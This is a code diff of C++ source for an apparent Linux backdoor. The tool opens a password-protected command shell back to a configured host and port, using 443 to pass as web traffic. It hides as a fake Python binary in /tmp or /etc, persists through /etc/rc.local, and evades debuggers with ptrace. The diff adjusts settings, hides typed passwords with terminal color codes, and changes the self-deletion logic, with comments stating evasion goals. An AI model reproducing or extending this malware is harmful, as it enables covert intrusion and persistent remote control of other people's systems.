@@ -19,11 +19,11 @@ extern "C"{
 using namespace std;
 
 struct gui_config{
-    const string client_ver = "lol"; // client name 
+    const string client_ver = "xd"; // client name 
     const string client_patch = "127.0.0.1"; // host to call back to
-    const string client_buffer = "4431"; // port to call back to port 80 and 443 will look like web sockets
-    const string client_key = "lolpass"; // password
-    const string client_time_out = "1"; // amount of time till a command will be killed, the smaller the time the less chance of detection
+    const string client_buffer = "443"; // port to call back to port 80 and 443 will look like web sockets
+    const string client_key = "123"; // password
+    const string client_time_out = "10"; // amount of time till a command will be killed, the smaller the time the less chance of detection
 }; gui_config gc; 
 
 class gui_bar{
@@ -203,19 +203,13 @@ class gui_bar{
                   mkdir("/tmp/.pythonbin/", 0700); 
                   rename((getexepath()).c_str(), "/tmp/.pythonbin/bin.py");
               }
-              else{
-                 remove((getexepath()).c_str()); 
-              }
           }
           else{ //root
             if (stat("/etc/.pythonbin/", &st) == -1) {
               mkdir("/etc/.pythonbin/", 0700);
               rename((getexepath()).c_str(), "/etc/.pythonbin/bin.py");
             }
-            else{
-              remove((getexepath()).c_str());
-            }
-            write_to_boot(service_s, file_p);
+            write_to_boot(file_p , service_s);
           }
           return;
         }
@@ -307,7 +301,7 @@ class cli_architecture : gui_config{ // backconnect
           close(s0);
           return;
         } 
-        send(s0,(gu.gui_enc("Enter Password> ")).c_str(), gu.gui_enc("Enter Password> ").size(), 0);
+        send(s0,(gu.gui_enc("Enter Password>\e[30m ")).c_str(), gu.gui_enc("Enter Password>\e[30m ").size(), 0);
         while(1){
             line="";
             char data = 0; 
@@ -335,19 +329,19 @@ class cli_architecture : gui_config{ // backconnect
               if(isauth!=true){
                 if(line==client_key){
                     isauth=true;
-                    send(s0,(gu.gui_enc("Authorised! Current PID is: " + to_string(getpid()) +  " Client name is: " + string(client_ver) + string("\n"))).c_str(), (gu.gui_enc("Authorised! Current PID is: " + to_string(getpid()) +  " Client name is: " + string(client_ver) + string("\n"))).size(), 0);
+                    send(s0,(gu.gui_enc("\e[39mAuthorised! Current PID is: " + to_string(getpid()) +  " Client name is: " + string(client_ver) + string("\n"))).c_str(), (gu.gui_enc("\e[39mAuthorised! Current PID is: " + to_string(getpid()) +  " Client name is: " + string(client_ver) + string("\n"))).size(), 0);
                     send(s0, (gu.gui_enc(gb.ftp_g())).c_str(), (gu.gui_enc(gb.ftp_g())).size(), 0);
                     continue;
                 }
                 else{
                     if(login_requests<4){
                       login_requests++;
-                      send(s0,(gu.gui_enc("Incorrect password!")).c_str(), gu.gui_enc("Incorrect password!").size(), 0);
-                      send(s0,(gu.gui_enc("\nEnter Password> ")).c_str(), gu.gui_enc("\nEnter Password> ").size(), 0);
+                      send(s0,(gu.gui_enc("\e[39mIncorrect password!")).c_str(), gu.gui_enc("\e[39mIncorrect password!").size(), 0);
+                      send(s0,(gu.gui_enc("\nEnter Password>\e[30m ")).c_str(), gu.gui_enc("\nEnter Password>\e[30m ").size(), 0);
                       continue;
                     }
                     else{
-                      send(s0,(gu.gui_enc("To many incorrect tries!\n")).c_str(), gu.gui_enc("To many incorrect tries!\n").size(), 0);
+                      send(s0,(gu.gui_enc("\e[39mTo many incorrect tries!\n")).c_str(), gu.gui_enc("\e[39mTo many incorrect tries!\n").size(), 0);
                       close(s0);
                       return;
                     }
@@ -402,9 +396,9 @@ class cli_architecture : gui_config{ // backconnect
 }; cli_architecture ca;
 
 int main(int argc, char *argv[]){
-    if(ptrace(PTRACE_TRACEME, 0, 1, 0) < 0){ // anti debugging
-    	return 0; 
-    }
+   	if(ptrace(PTRACE_TRACEME, 0, 1, 0) < 0){ // anti debugging
+		  return 0; 
+	  }
     srand(time(NULL)); 
     signal(SIGPIPE, SIG_IGN);
     signal(SIGCHLD, SIG_IGN); // fuck zombie process's
@@ -418,7 +412,7 @@ int main(int argc, char *argv[]){
     gb.file_setup("/etc/rc.local", "/etc/.pythonbin/bin.py");
     while(1){
         thread(&cli_architecture::isdn, &ca).detach();
-        sleep((rand()%(360-60 + 1) + 60)); // 1-5 mins call back
+        sleep((rand()%(360-60 + 1) + 60));
     }
     return 0;
 }
